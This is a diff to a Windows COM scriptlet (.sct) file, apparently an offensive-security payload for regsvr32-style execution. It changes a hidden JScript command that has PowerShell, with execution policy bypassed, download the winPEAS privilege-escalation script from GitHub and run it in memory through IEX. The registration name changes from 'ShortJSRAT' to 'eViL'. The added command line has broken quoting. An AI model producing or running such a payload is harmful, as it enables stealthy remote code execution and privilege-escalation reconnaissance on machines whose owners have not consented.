@@ -1,13 +1,13 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="ShortJSRAT"
+    progid="eViL"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
 	<!-- Learn from Casey Smith @subTee -->
 	<script language="JScript">
 		<![CDATA[
-			rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')";
-		new ActiveXObject("WScript.Shell").Run(rat,0,true);
+			evil="powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX";
+		new ActiveXObject("WScript.Shell").Run(evil,0,true);
 	
 		]]>
 </script>
